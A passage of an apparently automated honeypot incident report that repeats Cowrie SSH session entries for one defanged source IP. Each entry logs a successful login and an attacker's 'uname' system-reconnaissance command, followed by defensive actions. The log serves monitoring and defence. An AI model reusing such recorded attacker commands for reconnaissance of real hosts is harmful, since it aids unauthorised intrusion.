| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:11:07` | `cowrie.session.connect` |
| `2026-09-27 13:11:07` | `cowrie.client.version` |
| `2026-09-27 13:11:07` | `cowrie.client.kex` |
| `2026-09-27 13:11:08` | `cowrie.login.success` |
| `2026-09-27 13:11:09` | `cowrie.session.params` |
| `2026-09-27 13:11:09` | `cowrie.command.input` |
| `2026-09-27 13:11:09` | `cowrie.log.closed` |
| `2026-09-27 13:11:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-667e0f7c812c

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:11 |
| **Last Seen** | 2026-09-27 13:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:11:12` | `cowrie.session.connect` |
| `2026-09-27 13:11:12` | `cowrie.client.version` |
| `2026-09-27 13:11:12` | `cowrie.client.kex` |
| `2026-09-27 13:11:12` | `cowrie.login.success` |
| `2026-09-27 13:11:14` | `cowrie.session.params` |
| `2026-09-27 13:11:14` | `cowrie.command.input` |
| `2026-09-27 13:11:14` | `cowrie.log.closed` |
| `2026-09-27 13:11:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d62c179bdcf

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:11 |
| **Last Seen** | 2026-09-27 13:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:11:17` | `cowrie.session.connect` |
| `2026-09-27 13:11:17` | `cowrie.client.version` |
| `2026-09-27 13:11:17` | `cowrie.client.kex` |
| `2026-09-27 13:11:17` | `cowrie.login.success` |
| `2026-09-27 13:11:18` | `cowrie.session.params` |
| `2026-09-27 13:11:18` | `cowrie.command.input` |
| `2026-09-27 13:11:18` | `cowrie.log.closed` |
| `2026-09-27 13:11:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-062490613af8

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:11 |
| **Last Seen** | 2026-09-27 13:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:11:21` | `cowrie.session.connect` |
| `2026-09-27 13:11:21` | `cowrie.client.version` |
| `2026-09-27 13:11:21` | `cowrie.client.kex` |
| `2026-09-27 13:11:22` | `cowrie.login.success` |
| `2026-09-27 13:11:23` | `cowrie.session.params` |
| `2026-09-27 13:11:23` | `cowrie.command.input` |
| `2026-09-27 13:11:23` | `cowrie.log.closed` |
| `2026-09-27 13:11:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1616499aa113

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:11 |
| **Last Seen** | 2026-09-27 13:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:11:26` | `cowrie.session.connect` |
| `2026-09-27 13:11:26` | `cowrie.client.version` |
| `2026-09-27 13:11:26` | `cowrie.client.kex` |
| `2026-09-27 13:11:27` | `cowrie.login.success` |
| `2026-09-27 13:11:28` | `cowrie.session.params` |
| `2026-09-27 13:11:28` | `cowrie.command.input` |
| `2026-09-27 13:11:28` | `cowrie.log.closed` |
| `2026-09-27 13:11:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33c54d26e3b9

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:11 |
| **Last Seen** | 2026-09-27 13:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:11:31` | `cowrie.session.connect` |
| `2026-09-27 13:11:31` | `cowrie.client.version` |
| `2026-09-27 13:11:31` | `cowrie.client.kex` |
| `2026-09-27 13:11:32` | `cowrie.login.success` |
| `2026-09-27 13:11:33` | `cowrie.session.params` |
| `2026-09-27 13:11:33` | `cowrie.command.input` |
| `2026-09-27 13:11:33` | `cowrie.log.closed` |
| `2026-09-27 13:11:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce7e9912cdd4

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:11 |
| **Last Seen** | 2026-09-27 13:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:11:36` | `cowrie.session.connect` |
| `2026-09-27 13:11:36` | `cowrie.client.version` |
| `2026-09-27 13:11:36` | `cowrie.client.kex` |
| `2026-09-27 13:11:37` | `cowrie.login.success` |
| `2026-09-27 13:11:38` | `cowrie.session.params` |
| `2026-09-27 13:11:38` | `cowrie.command.input` |
| `2026-09-27 13:11:38` | `cowrie.log.closed` |
| `2026-09-27 13:11:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e15da1d75d7

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:11 |
| **Last Seen** | 2026-09-27 13:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:11:41` | `cowrie.session.connect` |
| `2026-09-27 13:11:41` | `cowrie.client.version` |
| `2026-09-27 13:11:41` | `cowrie.client.kex` |
| `2026-09-27 13:11:42` | `cowrie.login.success` |
| `2026-09-27 13:11:42` | `cowrie.session.params` |
| `2026-09-27 13:11:42` | `cowrie.command.input` |
| `2026-09-27 13:11:42` | `cowrie.log.closed` |
| `2026-09-27 13:11:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c50b1c0b961a

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:11 |
| **Last Seen** | 2026-09-27 13:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:11:46` | `cowrie.session.connect` |
| `2026-09-27 13:11:46` | `cowrie.client.version` |
| `2026-09-27 13:11:46` | `cowrie.client.kex` |
| `2026-09-27 13:11:46` | `cowrie.login.success` |
| `2026-09-27 13:11:47` | `cowrie.session.params` |
| `2026-09-27 13:11:47` | `cowrie.command.input` |
| `2026-09-27 13:11:47` | `cowrie.log.closed` |
| `2026-09-27 13:11:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1bea21b2009a

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:11 |
| **Last Seen** | 2026-09-27 13:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:11:51` | `cowrie.session.connect` |
| `2026-09-27 13:11:51` | `cowrie.client.version` |
| `2026-09-27 13:11:51` | `cowrie.client.kex` |
| `2026-09-27 13:11:52` | `cowrie.login.success` |
| `2026-09-27 13:11:52` | `cowrie.session.params` |
| `2026-09-27 13:11:52` | `cowrie.command.input` |
| `2026-09-27 13:11:52` | `cowrie.log.closed` |
| `2026-09-27 13:11:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3cced7f799c1

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:11 |
| **Last Seen** | 2026-09-27 13:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:11:56` | `cowrie.session.connect` |
| `2026-09-27 13:11:56` | `cowrie.client.version` |
| `2026-09-27 13:11:56` | `cowrie.client.kex` |
| `2026-09-27 13:11:57` | `cowrie.login.success` |
| `2026-09-27 13:11:58` | `cowrie.session.params` |
| `2026-09-27 13:11:58` | `cowrie.command.input` |
| `2026-09-27 13:11:58` | `cowrie.log.closed` |
| `2026-09-27 13:11:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65c4af4721a5

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:12 |
| **Last Seen** | 2026-09-27 13:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:12:01` | `cowrie.session.connect` |
| `2026-09-27 13:12:01` | `cowrie.client.version` |
| `2026-09-27 13:12:01` | `cowrie.client.kex` |
| `2026-09-27 13:12:02` | `cowrie.login.success` |
| `2026-09-27 13:12:02` | `cowrie.session.params` |
| `2026-09-27 13:12:02` | `cowrie.command.input` |
| `2026-09-27 13:12:03` | `cowrie.log.closed` |
| `2026-09-27 13:12:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a73da6681f76

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:12 |
| **Last Seen** | 2026-09-27 13:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:12:06` | `cowrie.session.connect` |
| `2026-09-27 13:12:06` | `cowrie.client.version` |
| `2026-09-27 13:12:06` | `cowrie.client.kex` |
| `2026-09-27 13:12:06` | `cowrie.login.success` |
| `2026-09-27 13:12:07` | `cowrie.session.params` |
| `2026-09-27 13:12:07` | `cowrie.command.input` |
| `2026-09-27 13:12:08` | `cowrie.log.closed` |
| `2026-09-27 13:12:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce5b8dedd01f

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:12 |
| **Last Seen** | 2026-09-27 13:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:12:11` | `cowrie.session.connect` |
| `2026-09-27 13:12:11` | `cowrie.client.version` |
| `2026-09-27 13:12:11` | `cowrie.client.kex` |
| `2026-09-27 13:12:12` | `cowrie.login.success` |
| `2026-09-27 13:12:12` | `cowrie.session.params` |
| `2026-09-27 13:12:12` | `cowrie.command.input` |
| `2026-09-27 13:12:12` | `cowrie.log.closed` |
| `2026-09-27 13:12:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d549fb6ebb8

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:12 |
| **Last Seen** | 2026-09-27 13:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:12:16` | `cowrie.session.connect` |
| `2026-09-27 13:12:16` | `cowrie.client.version` |
| `2026-09-27 13:12:16` | `cowrie.client.kex` |
| `2026-09-27 13:12:16` | `cowrie.login.success` |
| `2026-09-27 13:12:17` | `cowrie.session.params` |
| `2026-09-27 13:12:17` | `cowrie.command.input` |
| `2026-09-27 13:12:17` | `cowrie.log.closed` |
| `2026-09-27 13:12:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0b8f4d67602

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:12 |
| **Last Seen** | 2026-09-27 13:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:12:21` | `cowrie.session.connect` |
| `2026-09-27 13:12:21` | `cowrie.client.version` |
| `2026-09-27 13:12:21` | `cowrie.client.kex` |
| `2026-09-27 13:12:22` | `cowrie.login.success` |
| `2026-09-27 13:12:22` | `cowrie.session.params` |
| `2026-09-27 13:12:22` | `cowrie.command.input` |
| `2026-09-27 13:12:22` | `cowrie.log.closed` |
| `2026-09-27 13:12:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52b48ba5b643

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:12 |
| **Last Seen** | 2026-09-27 13:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:12:26` | `cowrie.session.connect` |
| `2026-09-27 13:12:27` | `cowrie.client.version` |
| `2026-09-27 13:12:27` | `cowrie.client.kex` |
| `2026-09-27 13:12:27` | `cowrie.login.success` |
| `2026-09-27 13:12:28` | `cowrie.session.params` |
| `2026-09-27 13:12:28` | `cowrie.command.input` |
| `2026-09-27 13:12:29` | `cowrie.log.closed` |
| `2026-09-27 13:12:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b57e947a2750

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:12 |
| **Last Seen** | 2026-09-27 13:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:12:31` | `cowrie.session.connect` |
| `2026-09-27 13:12:31` | `cowrie.client.version` |
| `2026-09-27 13:12:31` | `cowrie.client.kex` |
| `2026-09-27 13:12:32` | `cowrie.login.success` |
| `2026-09-27 13:12:33` | `cowrie.session.params` |
| `2026-09-27 13:12:33` | `cowrie.command.input` |
| `2026-09-27 13:12:33` | `cowrie.log.closed` |
| `2026-09-27 13:12:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-083088619da2

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:12 |
| **Last Seen** | 2026-09-27 13:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:12:36` | `cowrie.session.connect` |
| `2026-09-27 13:12:36` | `cowrie.client.version` |
| `2026-09-27 13:12:36` | `cowrie.client.kex` |
| `2026-09-27 13:12:37` | `cowrie.login.success` |
| `2026-09-27 13:12:38` | `cowrie.session.params` |
| `2026-09-27 13:12:38` | `cowrie.command.input` |
| `2026-09-27 13:12:38` | `cowrie.log.closed` |
| `2026-09-27 13:12:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec1ae4975d89

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:12 |
| **Last Seen** | 2026-09-27 13:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:12:41` | `cowrie.session.connect` |
| `2026-09-27 13:12:41` | `cowrie.client.version` |
| `2026-09-27 13:12:41` | `cowrie.client.kex` |
| `2026-09-27 13:12:42` | `cowrie.login.success` |
| `2026-09-27 13:12:43` | `cowrie.session.params` |
| `2026-09-27 13:12:43` | `cowrie.command.input` |
| `2026-09-27 13:12:43` | `cowrie.log.closed` |
| `2026-09-27 13:12:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d68c2741569

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:12 |
| **Last Seen** | 2026-09-27 13:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:12:46` | `cowrie.session.connect` |
| `2026-09-27 13:12:46` | `cowrie.client.version` |
| `2026-09-27 13:12:47` | `cowrie.client.kex` |
| `2026-09-27 13:12:47` | `cowrie.login.success` |
| `2026-09-27 13:12:48` | `cowrie.session.params` |
| `2026-09-27 13:12:48` | `cowrie.command.input` |
| `2026-09-27 13:12:48` | `cowrie.log.closed` |
| `2026-09-27 13:12:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e98a79f9d100

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:12 |
| **Last Seen** | 2026-09-27 13:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:12:51` | `cowrie.session.connect` |
| `2026-09-27 13:12:51` | `cowrie.client.version` |
| `2026-09-27 13:12:51` | `cowrie.client.kex` |
| `2026-09-27 13:12:51` | `cowrie.login.success` |
| `2026-09-27 13:12:52` | `cowrie.session.params` |
| `2026-09-27 13:12:52` | `cowrie.command.input` |
| `2026-09-27 13:12:52` | `cowrie.log.closed` |
| `2026-09-27 13:12:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8382740a51e

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:12 |
| **Last Seen** | 2026-09-27 13:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:12:55` | `cowrie.session.connect` |
| `2026-09-27 13:12:55` | `cowrie.client.version` |
| `2026-09-27 13:12:56` | `cowrie.client.kex` |
| `2026-09-27 13:12:56` | `cowrie.login.success` |
| `2026-09-27 13:12:57` | `cowrie.session.params` |
| `2026-09-27 13:12:57` | `cowrie.command.input` |
| `2026-09-27 13:12:57` | `cowrie.log.closed` |
| `2026-09-27 13:12:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad68e39ad516

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:13 |
| **Last Seen** | 2026-09-27 13:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:13:01` | `cowrie.session.connect` |
| `2026-09-27 13:13:01` | `cowrie.client.version` |
| `2026-09-27 13:13:01` | `cowrie.client.kex` |
| `2026-09-27 13:13:01` | `cowrie.login.success` |
| `2026-09-27 13:13:02` | `cowrie.session.params` |
| `2026-09-27 13:13:02` | `cowrie.command.input` |
| `2026-09-27 13:13:02` | `cowrie.log.closed` |
| `2026-09-27 13:13:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0128e95a5445

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:13 |
| **Last Seen** | 2026-09-27 13:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:13:06` | `cowrie.session.connect` |
| `2026-09-27 13:13:06` | `cowrie.client.version` |
| `2026-09-27 13:13:06` | `cowrie.client.kex` |
| `2026-09-27 13:13:07` | `cowrie.login.success` |
| `2026-09-27 13:13:07` | `cowrie.session.params` |
| `2026-09-27 13:13:07` | `cowrie.command.input` |
| `2026-09-27 13:13:08` | `cowrie.log.closed` |
| `2026-09-27 13:13:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bb89c686b72

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:13 |
| **Last Seen** | 2026-09-27 13:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:13:10` | `cowrie.session.connect` |
| `2026-09-27 13:13:10` | `cowrie.client.version` |
| `2026-09-27 13:13:10` | `cowrie.client.kex` |
| `2026-09-27 13:13:11` | `cowrie.login.success` |
| `2026-09-27 13:13:12` | `cowrie.session.params` |
| `2026-09-27 13:13:12` | `cowrie.command.input` |
| `2026-09-27 13:13:12` | `cowrie.log.closed` |
| `2026-09-27 13:13:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
